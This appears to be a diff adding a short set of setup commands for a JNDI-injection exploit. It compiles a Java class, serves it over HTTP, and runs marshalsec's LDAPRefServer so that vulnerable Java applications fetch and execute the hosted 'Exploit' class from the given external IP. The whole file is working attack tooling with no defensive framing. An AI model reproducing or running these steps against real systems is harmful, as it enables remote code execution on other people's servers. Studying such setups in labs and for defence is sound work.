@@ -1,0 +1,5 @@
+Assuming your external IP is 113.253.174.118...
+
+javac foo.java -source 8 -target 8
+python -m http.server
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://113.253.174.118:8000/#Exploit"
